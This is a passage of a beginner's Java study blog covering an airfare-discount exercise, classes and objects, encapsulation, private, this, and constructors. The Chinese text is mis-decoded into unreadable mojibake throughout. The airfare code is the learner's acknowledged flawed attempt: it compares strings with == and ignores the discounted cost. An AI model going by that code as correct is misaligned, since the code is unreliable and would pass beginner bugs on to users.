class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//å–é£æœºç¥¨</span><br><span class="hljs-keyword">import</span> java.util.Scanner;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">sc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br><br>        System.out.println(<span class="hljs-string">&quot;è¯·è¾“å…¥å½“å‰æœˆä»½ï¼š&quot;</span>);<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">month</span> <span class="hljs-operator">=</span> sc.nextInt();<br><br>        System.out.println(<span class="hljs-string">&quot;è¯·è¾“å…¥ç›®æ ‡æœºç¥¨ï¼š&quot;</span>);<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">type</span> <span class="hljs-operator">=</span> sc.next();<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">expensive</span> <span class="hljs-operator">=</span> <span class="hljs-number">1000</span>;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">cheap</span> <span class="hljs-operator">=</span> <span class="hljs-number">500</span>;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">money</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>        <span class="hljs-keyword">if</span> (type == <span class="hljs-string">&quot;å¤´ç­‰èˆ±&quot;</span>) &#123;<br><br>            money = expensive;<br><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            money = cheap;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-number">5</span> &lt;= month &amp;&amp; month &lt;= <span class="hljs-number">10</span>) &#123;<br><br>            System.out.println(<span class="hljs-string">&quot;èŠœæ¹–ï¼ç›®å‰æ˜¯æ·¡å­£ï¼Œæœºç¥¨ä»·æ ¼äº”æŠ˜ï¼&quot;</span>);<br><br>            <span class="hljs-type">double</span> <span class="hljs-variable">cost</span> <span class="hljs-operator">=</span> money * <span class="hljs-number">0.5</span>;<br><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;èŠœæ¹–ï¼ç›®å‰æ˜¯æ—ºå­£ï¼Œæœºç¥¨ä¸æ‰“æŠ˜&quot;</span>);<br><br>            <span class="hljs-type">double</span> <span class="hljs-variable">cost</span> <span class="hljs-operator">=</span> money;<br>        &#125;<br><br>        System.out.println(<span class="hljs-string">&quot;è¯·æ”¯ä»˜&quot;</span> + money + <span class="hljs-string">&quot;å…ƒ&quot;</span>);<br><br><br>    &#125;<br><br><br>&#125;<br></code></pre></td></tr></table></figure><p>å”‰ï¼Œçœ‹äº†æ ‡å‡†ç­”æ¡ˆï¼Œæ„Ÿè§‰æˆ‘åƒè„‘æ®‹</p><p>P74 - P81</p><h3 id="é¢å‘å¯¹è±¡"><a href="#é¢å‘å¯¹è±¡" class="headerlink" title="é¢å‘å¯¹è±¡"></a>é¢å‘å¯¹è±¡</h3><h4 id="é¢å‘å¯¹è±¡ä»‹ç»"><a href="#é¢å‘å¯¹è±¡ä»‹ç»" class="headerlink" title="é¢å‘å¯¹è±¡ä»‹ç»"></a>é¢å‘å¯¹è±¡ä»‹ç»</h4><p>è·å–&#x2F;è®¾è®¡å·²æœ‰å¯¹è±¡å¹¶ä½¿ç”¨</p><h4 id="è®¾è®¡å¯¹è±¡å¹¶ä½¿ç”¨"><a href="#è®¾è®¡å¯¹è±¡å¹¶ä½¿ç”¨" class="headerlink" title="è®¾è®¡å¯¹è±¡å¹¶ä½¿ç”¨"></a>è®¾è®¡å¯¹è±¡å¹¶ä½¿ç”¨</h4><ul><li>ç±»å’Œå¯¹è±¡</li></ul><p>ç±»ï¼šå¯¹è±¡å…±åŒç‰¹å¾çš„æè¿°</p><p>å¯¹è±¡ï¼šçœŸå®å­˜åœ¨çš„å…·ä½“ä¸œè¥¿</p><p>javaä¸­ï¼Œå¿…é¡»å…ˆè®¾è®¡ç±»ï¼Œæ‰èƒ½è·å¾—å¯¹è±¡</p><ul><li>å¦‚ä½•å®šä¹‰ç±»</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> class ç±»å&#123;<br><span class="hljs-number">1.</span>æˆå‘˜å˜é‡(ä»£è¡¨å±æ€§ï¼Œä¸€èˆ¬æ˜¯åè¯)<br><span class="hljs-number">2.</span>æˆå‘˜æ–¹æ³•(ä»£è¡¨è¡Œæ–‡ï¼Œä¸€èˆ¬æ˜¯åŠ¨è¯)<br><span class="hljs-number">3.</span>æ„é€ å™¨<br><span class="hljs-number">4.</span>ä»£ç å—<br><span class="hljs-number">5.</span>å†…éƒ¨ç±»<br>&#125;<br><span class="hljs-comment">//æ¯”å¦‚ï¼š</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Phone</span> &#123;<br>    <span class="hljs-comment">//å±æ€§</span><br>    String Name;<br><br>    <span class="hljs-type">double</span> Price;<br>    <span class="hljs-comment">//æ–¹æ³•</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">call</span><span class="hljs-params">()</span>&#123;&#125;<br>        <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">playGame</span><span class="hljs-params">()</span>&#123;&#125;    <br>    &#125;    <br></code></pre></td></tr></table></figure><ul><li>å¦‚ä½•å¾—åˆ°ç±»çš„å¯¹è±¡</li></ul><p>ç±»å å¯¹è±¡å &#x3D; new ç±»å();</p><p>Phone p &#x3D; new Phone();</p><ul><li>å¦‚ä½•ä½¿ç”¨å¯¹è±¡</li></ul><p>è®¿é—®å±æ€§ï¼šå¯¹è±¡å.æˆå‘˜å˜é‡</p><p>è®¿é—®è¡Œä¸ºï¼šå¯¹è±¡å.æ–¹æ³•å</p><ul><li>å®šä¹‰ç±»çš„æ³¨æ„äº‹é¡¹</li></ul><p>ç”¨æ¥æè¿°ä¸€ç±»äº‹ç‰©çš„ç±»ï¼Œä¸“ä¸šå«åšï¼š<code>javabean</code>ç±»ã€‚åœ¨è¯¥ç±»ä¸­ï¼Œä¸å†™<code>main</code>æ–¹æ³•ã€‚</p><p>ç¼–å†™<code>main</code>æ–¹æ³•çš„ç±»å«æµ‹è¯•ç±»ã€‚</p><p>ä¸€ä¸ªjavaæ–‡ä»¶ä¸­å¯ä»¥å®šä¹‰å¤šä¸ª<code>class</code>ç±»ï¼Œä½†åªèƒ½æœ‰ä¸€ä¸ªç±»æ˜¯<code>public</code>ä¿®é¥°ã€‚è€Œä¸”<code>public</code>ä¿®é¥°çš„ç±»åå¿…é¡»æ˜¯ä»£ç æ–‡ä»¶åã€‚ä¸è¿‡å®é™…å¼€å‘ä¸­å»ºè®®ä¸€ä¸ªæ–‡ä»¶å®šä¹‰ä¸€ä¸ª<code>class</code>ç±»ã€‚</p><p>æˆå‘˜å˜é‡çš„å®Œæ•´å®šä¹‰æ ¼å¼æ˜¯ï¼šä¿®é¥°ç¬¦ æ•°æ®ç±»å‹ å˜é‡åç§° &#x3D; åˆå§‹åŒ–å€¼; ä¸€èˆ¬æ— éœ€æŒ‡å®šåˆå§‹åŒ–å€¼ï¼Œå­˜åœ¨é»˜è®¤å€¼ã€‚</p><p><img src="/img/jajvalearn42.png" alt="jajvalearn42"></p><p>ç»ƒä¹ ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//girlFriendç±»</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">girlFriend</span> &#123;<br>    String name;<br><br>    <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sleep</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;sleeping&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">eat</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;eating&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-comment">//testgirl</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">testgril</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">girlFriend</span> <span class="hljs-variable">hername</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">girlFriend</span>();<br><br>        hername.age = <span class="hljs-number">21</span>;<br>        hername.name = <span class="hljs-string">&quot;what?&quot;</span>;<br>        hername.eat();<br>        hername.sleep();<br>        System.out.println(hername.age);<br>        System.out.println(hername.name);<br><br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>å¼€å‘ä¸­ç±»çš„è®¾è®¡</li></ul><h4 id="å°è£…"><a href="#å°è£…" class="headerlink" title="å°è£…"></a>å°è£…</h4><p>é¢å‘å¯¹è±¡ä¸‰å¤§ç‰¹å¾ï¼šå°è£…ï¼Œç»§æ‰¿ï¼Œå¤šæ€ã€‚</p><p>å°è£…ï¼šå¯¹è±¡ä»£è¡¨ä»€ä¹ˆï¼Œå°±å¾—å°è£…å¯¹åº”çš„æ•°æ®ï¼Œå¹¶æä¾›æ•°æ®å¯¹åº”çš„è¡Œä¸ºã€‚</p><p>å‘Šè¯‰æˆ‘ä»¬ï¼Œå¦‚ä½•æ­£ç¡®è®¾è®¡å¯¹è±¡çš„å±æ€§å’Œæ–¹æ³•ã€‚</p><p>å·²ç»è®¾è®¡å¥½çš„ç±»ï¼Œå…¶ä¸­ç±»çš„å†…éƒ¨ç»†èŠ‚è¢«éšè—ï¼Œè€Œé€šè¿‡å…¬å…±æ¥å£æä¾›å¯¹è¿™äº›ç»†èŠ‚çš„è®¿é—®å’Œä¿®æ”¹ã€‚è¿™æœ‰åŠ©äºå®ç°ç±»çš„å®‰å…¨æ€§å’Œçµæ´»æ€§ã€‚</p><h4 id="privateå…³é”®å­—"><a href="#privateå…³é”®å­—" class="headerlink" title="privateå…³é”®å­—"></a>privateå…³é”®å­—</h4><ul><li>æ˜¯ä¸€ä¸ªæƒé™ä¿®é¥°ç¬¦</li><li>å¯ä»¥ä¿®é¥°æˆå‘˜(æˆå‘˜å˜é‡å’Œæˆå‘˜æ–¹æ³•)</li><li>è¢«privateä¿®é¥°çš„æˆå‘˜åªèƒ½åœ¨æœ¬ç±»ä¸­æ‰èƒ½è®¿é—®</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GirlFriend</span> &#123;<br><span class="hljs-keyword">private</span> String name;<br><span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><span class="hljs-keyword">private</span> String gender;<br><br>&#125;<br><span class="hljs-type">GirlFriend</span> <span class="hljs-variable">gf1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">GirlFriend</span>();<br>gf1.age = <span class="hljs-number">18</span>;<br><span class="hljs-comment">//è¿™æ—¶ä¼šæŠ¥é”™ï¼Œå› ä¸ºä¸èƒ½åœ¨å…¶ä»–ç±»é‡Œè°ƒç”¨age</span><br></code></pre></td></tr></table></figure><p><img src="/img/javalearrn42.png" alt="javalearrn42"></p><p>å¯ä»¥è¿™æ ·ä¿®æ”¹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//girlwhat.java</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">girlwhat</span> &#123;<br>        <span class="hljs-keyword">private</span> String name;<br>        <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String n)</span>&#123;<br>            name = n;<br>        &#125;<br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span>&#123;<br>            <span class="hljs-keyword">return</span> name;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> a)</span>&#123;<br>            <span class="hljs-keyword">if</span> (a &gt; <span class="hljs-number">18</span> &amp;&amp; a &lt; <span class="hljs-number">30</span>)&#123;<br>                age = a;<br>            &#125;<span class="hljs-keyword">else</span> &#123;<br>                System.out.println(<span class="hljs-string">&quot;éæ³•å‚æ•°&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span>&#123;<br>            <span class="hljs-keyword">return</span> age;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sleep</span><span class="hljs-params">()</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;sleeping&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">eat</span><span class="hljs-params">()</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;eating&quot;</span>);<br>        &#125;<br><br>&#125;<br><span class="hljs-comment">//testgirl.java</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">testgril</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">girlwhat</span> <span class="hljs-variable">hername</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">girlwhat</span>();<br><br>        hername.setName(<span class="hljs-string">&quot;txy&quot;</span>);<br>        <span class="hljs-comment">//hername.getName();</span><br>        System.out.println(hername.getName());<br>        hername.setAge(<span class="hljs-number">18</span>);<br>        System.out.println(hername.getAge());<br>        hername.eat();<br>        hername.sleep();<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="thiså…³é”®å­—"><a href="#thiså…³é”®å­—" class="headerlink" title="thiså…³é”®å­—"></a>thiså…³é”®å­—</h4><ul><li>æˆå‘˜å˜é‡å’Œå±€éƒ¨å˜é‡</li></ul><p>å¯¹äºå¦‚ä¸‹ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">testtest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> age;<span class="hljs-comment">//è¿™ä¸œè¥¿æ˜¯æˆå‘˜å˜é‡</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>; <span class="hljs-comment">//è¿™ä¸œè¥¿æ˜¯å±€éƒ¨å˜é‡</span><br>        System.out.println(age);<br>    &#125;<br>&#125;<br><span class="hljs-comment">//æ­¤æ—¶éµå®ˆå°±è¿‘åŸåˆ™ï¼Œç»“æœæ˜¯10</span><br></code></pre></td></tr></table></figure><p><img src="/img/javalearn44.png" alt="javalearn44"></p><p><code>this</code>å…³é”®å­—å¯ä»¥å®šä½åˆ°æˆå‘˜å˜é‡ï¼Œä¹Ÿå¯ä»¥é€šè¿‡å°±è¿‘åŸåˆ™ï¼š</p><p><img src="/img/javalearn45.png" alt="javalearn45"></p><p>æ­¤æ—¶è¾“å‡ºçš„éƒ½æ˜¯æˆå‘˜å˜é‡ã€‚</p><p>æ‰€ä»¥ä¸Šé¢çš„ä»£ç å¯ä»¥è¿›è¡Œå¦‚ä¸‹æ›´æ”¹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">girlwhat</span> &#123;<br>        <span class="hljs-keyword">private</span> String name;<br>        <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span>&#123;<br>            <span class="hljs-built_in">this</span>.name = name;<br>        &#125;<br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span>&#123;<br>            <span class="hljs-keyword">return</span> name;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span>&#123;<br>            <span class="hljs-keyword">if</span> (age &gt; <span class="hljs-number">18</span> &amp;&amp; age &lt; <span class="hljs-number">30</span>)&#123;<br>                <span class="hljs-built_in">this</span>.age = age;<br>            &#125;<span class="hljs-keyword">else</span> &#123;<br>                System.out.println(<span class="hljs-string">&quot;éæ³•å‚æ•°&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span>&#123;<br>            <span class="hljs-keyword">return</span> age;<br>        &#125;<br></code></pre></td></tr></table></figure><p>æ³¨æ„ä¸¤ä¸ª<code>get</code>æ–¹æ³•ï¼ŒåŠ ä¸åŠ <code>this</code>éƒ½è¡Œã€‚</p><p>æ€»ç»“ï¼š<code>this</code>å…³é”®å­—å°±æ˜¯æŒ‡æˆå‘˜å˜é‡(é¿å…å’Œå±€éƒ¨å˜é‡æ··æ·†)ã€‚å½“ç„¶ä¹Ÿå¯ä»¥é€šè¿‡å°±è¿‘åŸåˆ™é¿å…è¿™ä¸ªé—®é¢˜ã€‚</p><h4 id="æ„é€ æ–¹æ³•"><a href="#æ„é€ æ–¹æ³•" class="headerlink" title="æ„é€ æ–¹æ³•"></a>æ„é€ æ–¹æ³•</h4><ul><li>æ¦‚è¿°ï¼šä¹Ÿå«åšæ„é€ å™¨ã€æ„é€ å‡½æ•°ã€‚</li><li>ä½œç”¨ï¼šåœ¨åˆ›å»ºå¯¹è±¡æ—¶ç»™æˆå‘˜å˜é‡è¿›è¡Œåˆå§‹åŒ–ã€‚</li></ul><p>æ¯”å¦‚å¯¹äºï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StudentDemo</span> &#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br><span class="hljs-type">Student</span> <span class="hljs-variable">s1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<span class="hljs-comment">//è¿™ä¸ªç©ºæ‹¬å·è¡¨ç¤ºç©ºå‚çš„æ„é€ æ–¹æ³•</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ„é€ æ–¹æ³•çš„æ ¼å¼ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br><br>ä¿®é¥°ç¬¦ ç±»å(å‚æ•°) &#123; <br>æ–¹æ³•ä½“;<br>&#125;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><p>æ‡’å¾—æ‰“å­—äº†ã€‚ã€‚ç›´æ¥è´´å›¾ç‰‡äº†</p><p><img src="/img/javalearn47.png" alt="javalearn47"></p><p>ç©ºå‚æ„é€ ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">testgril</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">girlwhat</span> <span class="hljs-variable">hername</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">girlwhat</span>();<br><br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">girlwhat</span> &#123;<br>        <span class="hljs-keyword">private</span> String name;<br>        <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">girlwhat</span><span class="hljs-params">()</span>&#123;<br>            System.out.println(<span class="hljs-string">&quot;èŠœæ¹–ï¼æˆ‘æ˜¯ç©ºå‚æ„é€ &quot;</span>);<br>        &#125;<br>&#125;<br><br><span class="hljs-comment">//ç»“æœä¼šè¾“å‡º èŠœæ¹–ï¼æˆ‘æ˜¯ç©ºå‚æ„é€ </span><br></code></pre></td></tr></table></figure><p>å½“ç„¶ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥åˆ©ç”¨æœ‰å‚æ„é€ åœ¨åˆ›å»ºå¯¹è±¡çš„æ—¶å€™å°±ç»™æˆå‘˜å˜é‡èµ‹å€¼ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//ä¿®æ”¹girlwhatä¸ºå¦‚ä¸‹ï¼š</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">girlwhat</span> &#123;<br>        <span class="hljs-keyword">private</span> String name;<br>        <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">girlwhat</span><span class="hljs-params">()</span>&#123;<br>            System.out.println(<span class="hljs-string">&quot;èŠœæ¹–ï¼æˆ‘æ˜¯ç©ºå‚æ„é€ &quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">girlwhat</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span>&#123;<br>            <span class="hljs-built_in">this</span>.name = name;<br>            <span class="hljs-built_in">this</span>.age = age;<br>            System.out.println(<span class="hljs-string">&quot;ä½ ä½¿ç”¨äº†æœ‰å‚æ„é€ &quot;</span>);<br>        &#125;<br><span class="hljs-comment">//testgirl:</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">testgril</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">girlwhat</span> <span class="hljs-variable">hername</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">girlwhat</span>();<br>        <span class="hljs-type">girlwhat</span> <span class="hljs-variable">hername2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">girlwhat</span>(<span class="hljs-string">&quot;txy&quot;</span>,<span class="hljs-number">22</span>);<br>        System.out.println(hername2.getName());<br>        System.out.println(hername2.getAge());<br>    &#125;<br>&#125;<br><span class="hljs-comment">//ç»“æœï¼š</span><br>èŠœæ¹–ï¼æˆ‘æ˜¯ç©ºå‚æ„é€ <br>ä½ ä½¿ç”¨äº†æœ‰å‚æ„é€ <br>txy<br><span class="hljs-number">22</span><br><br></code></pre></td></tr></table></figure><p>æ„é€ æ–¹æ³•æ³¨æ„äº‹é¡¹ï¼š</p><ul><li><p>å¦‚æœæ²¡æœ‰å®šä¹‰æ„é€ æ–¹æ³•ï¼Œç³»ç»Ÿå°†ä¼šç»™å‡ºä¸€ä¸ªé»˜è®¤çš„æ— å‚æ•°æ„é€ æ–¹æ³•ã€‚</p></li><li><p>å¦‚æœå®šä¹‰äº†æ„é€ æ–¹æ³•ï¼Œç³»ç»Ÿå°†ä¸å†æä¾›é»˜è®¤çš„æ„é€ æ–¹æ³•ã€‚(æ¯”å¦‚ä½ å·²ç»å®šä¹‰äº†ä¸€ä¸ªæœ‰å‚æ„é€ ï¼Œæ­¤æ—¶å†è°ƒç”¨æ— å‚æ„é€ ç³»ç»Ÿå°±ä¼šæŠ¥é”™)ã€‚</p></li><li><p>æ„é€ æ–¹æ³•çš„é‡è½½ï¼šå¸¦å‚æ„é€ æ–¹æ³•å’Œæ— å‚æ„é€ 